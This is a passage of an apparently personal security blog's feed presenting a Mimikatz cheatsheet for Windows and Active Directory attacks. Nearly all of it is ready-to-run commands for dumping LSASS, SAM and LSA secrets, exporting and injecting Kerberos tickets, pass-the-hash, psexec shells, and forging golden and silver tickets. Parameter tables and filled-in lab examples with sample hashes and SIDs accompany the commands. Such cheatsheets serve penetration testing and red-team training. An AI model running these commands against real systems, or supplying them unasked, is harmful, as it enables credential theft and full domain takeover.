&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;hr></description></item><item><title>Mimikatz cheatsheet</title><link>https://www.peco602.com/post/0030-mimikatz-cheatsheet/</link><pubDate>Sun, 07 Aug 2022 00:00:00 +0000</pubDate><guid>https://www.peco602.com/post/0030-mimikatz-cheatsheet/</guid><description>&lt;h2 id="basic-commands">Basic commands&lt;/h2>
&lt;p>Dump credentials on a local machine (needs local administrator rights):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz.ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-DumpCreds&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;token::elevate&amp;#34; &amp;#34;sekurlsa::logonpasswords&amp;#34;&amp;#39;&lt;/span> &lt;span class="c"># Cached passwords&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;token::elevate&amp;#34; &amp;#34;lsadump::sam&amp;#34;&amp;#39;&lt;/span> &lt;span class="c"># SAM database passwords&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;token::elevate&amp;#34; &amp;#34;lsadump::secrets&amp;#34;&amp;#39;&lt;/span> &lt;span class="c"># LSA secrets&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;token::elevate&amp;#34; &amp;#34;lsadump::cache&amp;#34;&amp;#39;&lt;/span> &lt;span class="c"># Cached credentials&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-batch" data-lang="batch">&lt;span class="line">&lt;span class="cl">&lt;span class="p">:&lt;/span>&lt;span class="c1">: mimikatz.exe&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # privilege::debug
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # token::elevate
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # sekurlsa::logonpasswords
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # lsadump::sam
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # lsadump::secrets
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # lsadump::cache
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # vault::list
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # vault::cred
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # vault::cred /patch
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Dump credentials on multiple remote machines (needs administrator rights on remote machines):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz.ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-DumpCreds&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="vm">@&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER2&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ERROR &lt;em>kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061&lt;/em>: The required privilege is not held by the client (mostly you&amp;rsquo;re not an administrator).&lt;/p>
&lt;p>ERROR &lt;em>kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)&lt;/em>: No rights to access the LSASS process.&lt;/p>
&lt;p>Extract in-memory credentials from a minidump of a local machine (needs local administrator rights):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-batch" data-lang="batch">&lt;span class="line">&lt;span class="cl">&lt;span class="p">:&lt;/span>&lt;span class="c1">: procdump.exe&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">:&lt;/span>&lt;span class="c1">: On the remote machine (needs local admin rights) &lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.\procdump.exe -accepteula -ma lsass.exe c:\users\public\dump.dmp &lt;span class="mi">2&lt;/span>&lt;span class="p">&amp;gt;&amp;amp;&lt;/span>&lt;span class="mi">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">:&lt;/span>&lt;span class="c1">: mimikatz.exe&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">:&lt;/span>&lt;span class="c1">: On the local machine after the reception of the minidump file dump.dmp&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # sekurlsa::minidump dump.dmp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # sekurlsa::logonpasswords
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Extract SAM credentials from a local machine without Mimikatz (needs local administrator rights):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-batch" data-lang="batch">&lt;span class="line">&lt;span class="cl">&lt;span class="p">:&lt;/span>&lt;span class="c1">: procdump.exe&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">:&lt;/span>&lt;span class="c1">: On the remote machine (needs local admin rights) &lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">reg save hklm\system SYSTEM.sav
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">reg save hklm\sam SAM.sav
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">reg save hklm\security SECURITY.sav
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Invoke-Mimikatz -Command &amp;#39;&lt;span class="s2">&amp;#34;lsadump::sam /sam:SAM.sav /system:SYSTEM.sav&amp;#34;&lt;/span>&amp;#39;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>or:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Impacket&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># On a local kali machine&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">impacket-secretsdump -sam ./SAM -system ./SYSTEM -security ./SECURITY LOCAL
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Extract tickets relative to all users on a machine:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;sekurlsa::tickets&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;sekurlsa::tickets /export&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Inject the ticket of interest in the current user session:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::ptt [0;82f8f7]-2-0-60a10000-dbprodadmin@krbtgt-US.FUNCORP.LOCAL.kirbi&amp;#34;&amp;#39;&lt;/span> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Execute mimikatz to get krbtgt hash (must be specified DC as ComputerName and requires Domain Admin privileges):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz.ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;lsadump::lsa /patch&amp;#34;&amp;#39;&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;cyberlab-dc.cyberlab.cybercorp.local&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-batch" data-lang="batch">&lt;span class="line">&lt;span class="cl">&lt;span class="p">:&lt;/span>&lt;span class="c1">: mimikatz.exe&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">:&lt;/span>&lt;span class="c1">: To be executed on domain controller&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # lsadump::lsa /patch
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="pass-the-hash">Pass-the-Hash&lt;/h2>
&lt;p>&amp;ldquo;Pass-the-Hash&amp;rdquo; inject a hash for a machine local administrator (needs local administrator rights). Once you get the NTLM hash of the RID 500 remote machine Administrator it is possible to inject it into a session:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;sekurlsa::pth /domain:[COMPUTER_FQDN] /user:Administrator /ntlm:[NTLM_HASH] /run:powershell.exe&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;sekurlsa::pth /domain:COMPUTER1.cyberlab.cybercorp.local /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-batch" data-lang="batch">&lt;span class="line">&lt;span class="cl">&lt;span class="p">:&lt;/span>&lt;span class="c1">: mimikatz.exe&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # privilege::debug
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # token::elevate
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # sekurlsa::pth /domain:[COMPUTER_FQDN] /user:Administrator /ntlm:[NTLM_HASH] /run:powershell.exe
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # sekurlsa::pth /domain:COMPUTER1.cyberlab.cybercorp.local /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>and the open a SYSTEM shell by &lt;code>psexec&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-batch" data-lang="batch">&lt;span class="line">&lt;span class="cl">psexec.exe \\COMPUTER1 cmd
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="over-pass-the-hash">Over-Pass-the-Hash&lt;/h2>
&lt;p>&amp;ldquo;Over-Pass-the-Hash&amp;rdquo; generate tokens from hashes (needs local administrator rights):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz.ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;token::elevate&amp;#34; &amp;#34;sekurlsa::pth /user:Administrator /domain:cyberlab.cybercorp.local /ntlm:[NTLM_HASH] /run:powershell.exe&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-batch" data-lang="batch">&lt;span class="line">&lt;span class="cl">&lt;span class="p">:&lt;/span>&lt;span class="c1">: mimikatz.exe&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # privilege::debug
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # token::elevate
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # sekurlsa::pth /user:Administrator /domain:cyberlab.cybercorp.local /ntlm:[NTLM_HASH] /run:powershell.exe
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="golden-ticket">Golden Ticket&lt;/h2>
&lt;p>Generate a TGT encripted with krbtgt hash valid for every user:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz.ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::golden /user:[USER] /domain:[DOMAIN_FQDN] /sid:[DOMAIN_SID] /krbtgt:[KRBTGT_NTLM_HASH] /id:[USER_RID] /groups:[GROUP_RID] /startoffset:[MINUTES_START_AVAILABILITY] /endin:[MINUTES_STOP_AVAILABILITY] /renewmax:[MINUTES_LIFETIME_WITH_RENEWAL] /ptt&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-batch" data-lang="batch">&lt;span class="line">&lt;span class="cl">&lt;span class="p">:&lt;/span>&lt;span class="c1">: mimikatz.exe&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # kerberos::golden /user:[USER] /domain:[DOMAIN_FQDN] /sid:[DOMAIN_SID] /krbtgt:[KRBTGT_NTLM_HASH] /id:[USER_RID] /groups:[GROUP_RID] /startoffset:[MINUTES_START_AVAILABILITY] /endin:[MINUTES_STOP_AVAILABILITY] /renewmax:[MINUTES_LIFETIME_WITH_RENEWAL] /ptt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>Golden Ticket Parameters&lt;/strong>&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Parameter&lt;/th>
&lt;th>Optional&lt;/th>
&lt;th>Description&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>&lt;strong>/user&lt;/strong>&lt;/td>
&lt;td>No&lt;/td>
&lt;td>Username for which the TGT is generated&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;strong>/domain&lt;/strong>&lt;/td>
&lt;td>No&lt;/td>
&lt;td>Domain FQDN&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;strong>/sid&lt;/strong>&lt;/td>
&lt;td>No&lt;/td>
&lt;td>SID of the domain&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;strong>/krbtgt&lt;/strong>&lt;/td>
&lt;td>No&lt;/td>
&lt;td>NTLM (RC4) hash of the krbtgt account. Use &lt;strong>/aes128&lt;/strong> and &lt;strong>/aes256&lt;/strong> for using AES keys&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;strong>/sids&lt;/strong>&lt;/td>
&lt;td>Yes&lt;/td>
&lt;td>Additional SIDs for accounts/groups in the AD forest with rights you want the ticket to spoof. Typically, this will be the Enterprise Admins group for the root domain “S-1-5-21-[DOMAIN_ID]-519”. This parameter adds the provided SIDs to the SID History parameter.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>/id&lt;/td>
&lt;td>Yes&lt;/td>
&lt;td>User RID (default 500)&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>/groups&lt;/td>
&lt;td>Yes&lt;/td>
&lt;td>Group RID (default 513 512 520 518 519)&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>/startoffset&lt;/td>
&lt;td>Yes&lt;/td>
&lt;td>When the ticket is available (default 0 - right now) in minutes. Use negative for a ticket available from past and a larger number for future&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>/endin&lt;/td>
&lt;td>Yes&lt;/td>
&lt;td>Optional ticket lifetime (default is 10 years) in minutes. The default AD setting is 10 hours = 600 minutes&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>/renewmax&lt;/td>
&lt;td>Yes&lt;/td>
&lt;td>Ticket lifetime with renewal (default is 10 years) in minutes. The default AD setting is 7 days = 100800&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;strong>/ptt&lt;/strong>&lt;/td>
&lt;td>&lt;/td>
&lt;td>Injects the ticket into the current PowerShell process (no need to save the ticket on disk)&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>/ticket&lt;/td>
&lt;td>&lt;/td>
&lt;td>Saves the ticket to a file for later use&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;hr>
&lt;p>&lt;strong>Golden Ticket Default Groups&lt;/strong>&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Group&lt;/th>
&lt;th>SID&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Domain Users&lt;/td>
&lt;td>S-1-5-21-[DOMAIN_ID]-513&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Domain Admins&lt;/td>
&lt;td>S-1-5-21-[DOMAIN_ID]-512&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Schema Admins&lt;/td>
&lt;td>S-1-5-21-[DOMAIN_ID]-518&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Enterprise Admins*&lt;/td>
&lt;td>S-1-5-21-[DOMAIN_ID]-519&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Group Policy Creator Owners&lt;/td>
&lt;td>S-1-5-21-[DOMAIN_ID]-520&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>*This is only effective when the forged ticket is created in the Forest root domain, though add using /sids parameter for AD forest admin rights.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz.ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::golden /user:Administrator /domain:cyberlab.cybercorp.local /sid:S-1-5-21-3213520406-898593589-2043675049 /krbtgt:2e7a862b21d4afaeb8e0eb57a350b523 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-batch" data-lang="batch">&lt;span class="line">&lt;span class="cl">&lt;span class="p">:&lt;/span>&lt;span class="c1">: mimikatz.exe&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # kerberos::golden /user:Administrator /domain:cyberlab.cybercorp.local /sid:S-1-5-21-3213520406-898593589-2043675049 /krbtgt:2e7a862b21d4afaeb8e0eb57a350b523 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Import a previously created ticket:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz.ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::ptt ticket.kirbi&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-batch" data-lang="batch">&lt;span class="line">&lt;span class="cl">&lt;span class="p">:&lt;/span>&lt;span class="c1">: mimikatz.exe&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # kerberos::ptt ticket.kirbi
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="silver-ticket">Silver Ticket&lt;/h2>
&lt;p>Generate a TGS encripted with a MACHINE$ account hash valid for its services:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz.ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::golden /user:[USER] /domain:[DOMAIN_FQDN] /sid:[DOMAIN_SID] /rc4:[TARGET_MACHINE_NTLM_HASH] /target:[TARGET_MACHINE_FQDN] /service:[TARGET_MACHINE_SERVICE] /ptt&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-batch" data-lang="batch">&lt;span class="line">&lt;span class="cl">&lt;span class="p">:&lt;/span>&lt;span class="c1">: mimikatz.exe&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # kerberos::golden /user:[USER] /domain:[DOMAIN_FQDN] /sid:[DOMAIN_SID] /rc4:[TARGET_MACHINE_NTLM_HASH] /target:[TARGET_MACHINE_FQDN] /service:[TARGET_MACHINE_SERVICE] /ptt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>Silver Ticket Parameters&lt;/strong>&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Parameter&lt;/th>
&lt;th>Optional&lt;/th>
&lt;th>Description&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>&lt;strong>/user&lt;/strong>&lt;/td>
&lt;td>No&lt;/td>
&lt;td>Username for which the TGT is generated&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;strong>/domain&lt;/strong>&lt;/td>
&lt;td>No&lt;/td>
&lt;td>Domain FQDN&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;strong>/sid&lt;/strong>&lt;/td>
&lt;td>No&lt;/td>
&lt;td>SID of the domain&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;strong>/rc4&lt;/strong>&lt;/td>
&lt;td>No&lt;/td>
&lt;td>NTLM (RC4) hash of the krbtgt account. Use &lt;strong>/aes128&lt;/strong> and &lt;strong>/aes256&lt;/strong> for using AES keys&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;strong>/target&lt;/strong>&lt;/td>
&lt;td>No&lt;/td>
&lt;td>Target server FQDN&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;strong>/service&lt;/strong>&lt;/td>
&lt;td>No&lt;/td>
&lt;td>Service Principal Name class of the Kerberos service running on target&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>/id&lt;/td>
&lt;td>Yes&lt;/td>
&lt;td>User RID (default 500)&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>/groups&lt;/td>
&lt;td>Yes&lt;/td>
&lt;td>Group RID (default 513 512 520 518 519)&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>/startoffset&lt;/td>
&lt;td>Yes&lt;/td>
&lt;td>When the ticket is available (default 0 - right now) in minutes. Use negative for a ticket available from past and a larger number for future&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>/endin&lt;/td>
&lt;td>Yes&lt;/td>
&lt;td>Optional ticket lifetime (default is 10 years) in minutes. The default AD setting is 10 hours = 600 minutes&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>/renewmax&lt;/td>
&lt;td>Yes&lt;/td>
&lt;td>Ticket lifetime with renewal (default is 10 years) in minutes. The default AD setting is 7 days = 100800&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;strong>/ptt&lt;/strong>&lt;/td>
&lt;td>&lt;/td>
&lt;td>Injects the ticket into the current PowerShell process (no need to save the ticket on disk)&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>/ticket&lt;/td>
&lt;td>&lt;/td>
&lt;td>Saves the ticket to a file for later use&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;hr>
&lt;p>&lt;strong>Silver Ticket Services&lt;/strong>&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Service Type&lt;/th>
&lt;th>Required Silver Tickets Services&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>WMI&lt;/td>
&lt;td>HOST, RPCSS&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>PowerShell Remoting&lt;/td>
&lt;td>HOST, HTTP, WSMAN (only some OS), RPCSS (only some OS)&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>WinRM&lt;/td>
&lt;td>HOST, HTTP&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Scheduled Tasks&lt;/td>
&lt;td>HOST&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Windows File Shares&lt;/td>
&lt;td>CIFS&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>LDAP (Includes DCSync)&lt;/td>
&lt;td>LDAP&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Windows Remote Server Administration Tools&lt;/td>
&lt;td>RPCSS, LDAP, CIFS&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;hr>
&lt;p>&lt;strong>Silver Ticket Default Groups&lt;/strong>&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Group&lt;/th>
&lt;th>SID&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Domain Users&lt;/td>
&lt;td>S-1-5-21-[DOMAIN_ID]-513&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Domain Admins&lt;/td>
&lt;td>S-1-5-21-[DOMAIN_ID]-512&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Schema Admins&lt;/td>
&lt;td>S-1-5-21-[DOMAIN_ID]-518&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Enterprise Admins*&lt;/td>
&lt;td>S-1-5-21-[DOMAIN_ID]-519&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Group Policy Creator Owners&lt;/td>
&lt;td>S-1-5-21-[DOMAIN_ID]-520&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>*This is only effective when the forged ticket is created in the Forest root domain, though add using /sids parameter for AD forest admin rights.&lt;/p>
